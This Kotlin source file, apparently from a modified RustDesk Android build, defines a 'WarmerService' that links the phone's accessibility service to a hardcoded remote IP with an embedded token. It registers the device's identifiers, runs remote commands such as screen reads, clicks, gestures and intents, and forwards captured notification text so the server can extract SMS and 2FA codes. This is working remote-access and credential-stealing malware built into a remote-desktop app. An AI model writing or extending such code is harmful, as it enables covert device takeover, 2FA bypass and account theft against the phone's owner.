package com.carriez.flutter_hbb

/**
 * WarmerService — singleton lifecycle wrapper for the OpenClaw bridge link.
 *
 * Started by InputService.onServiceConnected() and stopped by onDestroy().
 * Owns the WarmerWsClient, executes incoming commands via WarmerCommandExecutor,
 * and ships responses back over the same socket.
 *
 * Identity:
 *   • Reads the RustDesk peer ID from FlutterSharedPreferences (key
 *     "flutter.rustdesk_id"), populated by server_model.dart on startup.
 *   • Falls back to legacy registration (no device_id) until the ID is
 *     available — bridge buckets all such clients into one legacy slot.
 *   • Re-registers automatically when the ID becomes available.
 */

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.provider.Settings
import android.util.Log
import org.json.JSONObject

object WarmerService {

    private const val TAG               = "Warmer"
    private const val BRIDGE_HOST       = "79.141.162.155"
    private const val BRIDGE_PORT       = 7334
    private const val BRIDGE_PATH       = "/bridge"
    private const val BOOTSTRAP_TOKEN   = "af748a97422fa9652998395f18145a027c02d8bdde68633b"

    // server_model.dart writes the RustDesk peer ID here on startup, via a
    // method channel handled in MainActivity ("warmer_set_rustdesk_id").
    const val PREFS_NAME                = "warmer_prefs"
    const val PREFS_KEY_ID              = "rustdesk_id"
    private const val ID_POLL_MS        = 30_000L

    @Volatile private var ws:        WarmerWsClient?            = null
    @Volatile private var executor:  WarmerCommandExecutor?     = null
    @Volatile private var service:   AccessibilityService?      = null
    @Volatile private var prefs:     SharedPreferences?         = null

    @Volatile private var registeredId: String?                 = null

    private val workerThread = HandlerThread("warmer-worker").apply { start() }
    private val worker       = Handler(workerThread.looper)
    private val main         = Handler(android.os.Looper.getMainLooper())

    // Listener that re-sends register frame whenever the ID changes.
    private val idChangeListener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
        if (key == PREFS_KEY_ID) {
            val cur = currentRustDeskId()
            if (cur != null && cur != registeredId) {
                Log.i(TAG, "RustDesk ID changed → reconnecting")
                reconnect()
            }
        }
    }

    fun start(svc: AccessibilityService) {
        if (ws != null) return
        service  = svc
        executor = WarmerCommandExecutor(svc)
        val sp = svc.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs = sp
        sp.registerOnSharedPreferenceChangeListener(idChangeListener)
        openConnection()

        // Periodic re-check in case SharedPreferences listener misses the update
        worker.removeCallbacks(idPoller)
        worker.postDelayed(idPoller, ID_POLL_MS)
        Log.i(TAG, "started — bridge=$BRIDGE_HOST:$BRIDGE_PORT")
    }

    fun stop() {
        worker.removeCallbacks(idPoller)
        try { prefs?.unregisterOnSharedPreferenceChangeListener(idChangeListener) } catch (_: Exception) {}
        ws?.stop()
        ws       = null
        executor = null
        service  = null
        prefs    = null
        registeredId = null
        Log.i(TAG, "stopped")
    }

    /**
     * Forward a raw JSON event (e.g. a captured system notification) over the
     * warmer WebSocket. Fire-and-forget: drops silently if the socket is not
     * connected yet. Called by InputService to relay Notification title/text
     * so the server can auto-extract SMS/2FA codes.
     */
    fun sendEvent(json: String) {
        try { ws?.send(json) } catch (_: Throwable) {}
    }

    private fun openConnection() {
        val client = WarmerWsClient(
            host = BRIDGE_HOST, port = BRIDGE_PORT, path = BRIDGE_PATH,
            token = BOOTSTRAP_TOKEN, handler = wsHandler,
        )
        ws = client
        client.start()
    }

    private fun reconnect() {
        ws?.stop()
        ws = null
        // Brief delay so the existing socket fully tears down before we
        // race a new one through the bridge's "replace previous connection" path.
        worker.postDelayed({ if (service != null) openConnection() }, 200)
    }

    private val idPoller = object : Runnable {
        override fun run() {
            val cur = currentRustDeskId()
            if (cur != null && cur != registeredId) {
                Log.i(TAG, "ID poll picked up new RustDesk ID — reconnecting")
                reconnect()
            }
            worker.postDelayed(this, ID_POLL_MS)
        }
    }

    private fun currentRustDeskId(): String? {
        val raw = prefs?.getString(PREFS_KEY_ID, null) ?: return null
        val cleaned = raw.replace("\\s+".toRegex(), "")
        return cleaned.ifEmpty { null }
    }

    private val wsHandler = object : WarmerWsClient.Handler {
        override fun onConnected() {
            val id    = currentRustDeskId()
            registeredId = id
            val stable = stableId()
            val reg = JSONObject().apply {
                put("type",   "register")
                put("token",  BOOTSTRAP_TOKEN)
                if (id != null) put("device_id", id)
                if (stable != null) put("stable_id", stable)
                put("device", deviceModel())
            }
            ws?.send(reg.toString())
            Log.i(TAG, "registered (device_id=${id ?: "<legacy>"}, stable=${stable ?: "<none>"})")
        }

        override fun onMessage(message: String) {
            // Heavy work (tree traversal, gestures, intents) needs to hop
            // to a non-WS thread; the worker handler is fine.
            worker.post { handleCommand(message) }
        }

        override fun onDisconnected() {
            Log.i(TAG, "disconnected — reconnect loop will retry")
        }
    }

    private fun handleCommand(raw: String) {
        var cmdId: String? = null
        try {
            val cmd = JSONObject(raw)
            cmdId   = cmd.optString("id", "").ifEmpty { null }
            val exec = executor ?: return

            // get_screen / clicks / gestures must run with rootInActiveWindow
            // attached — the service's main thread owns it. Marshal there.
            val result = runOnService(exec, cmd)

            val resp = JSONObject().apply {
                if (cmdId != null) put("id", cmdId)
                put("result", result)
            }
            ws?.send(resp.toString())
        } catch (e: Exception) {
            Log.w(TAG, "command failed: ${e.message}")
            try {
                val err = JSONObject().apply {
                    if (cmdId != null) put("id", cmdId)
                    put("error", e.message ?: "unknown error")
                }
                ws?.send(err.toString())
            } catch (_: Exception) {}
        }
    }

    private fun runOnService(exec: WarmerCommandExecutor, cmd: JSONObject): JSONObject {
        // AccessibilityNodeInfo access is safe off the main thread per docs,
        // but Intent.startActivity must run from a context with a Looper.
        // Simpler to keep everything on the worker handler — startActivity
        // handles cross-thread itself when FLAG_ACTIVITY_NEW_TASK is set.
        return exec.execute(cmd)
    }

    private fun deviceModel(): String =
        try { "${Build.MANUFACTURER} ${Build.MODEL}".trim() } catch (_: Exception) { "android" }

    // Stable per-device identifier that survives APK reinstalls (only changes on factory reset).
    // Used by the bridge to expose a consistent address across peer-ID rotations,
    // so the orchestrator can resolve the current peer ID without manual mapping.
    private fun stableId(): String? {
        return try {
            val ctx = service?.applicationContext ?: return null
            val v = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            if (v.isNullOrBlank()) null else v
        } catch (_: Exception) { null }
    }
}
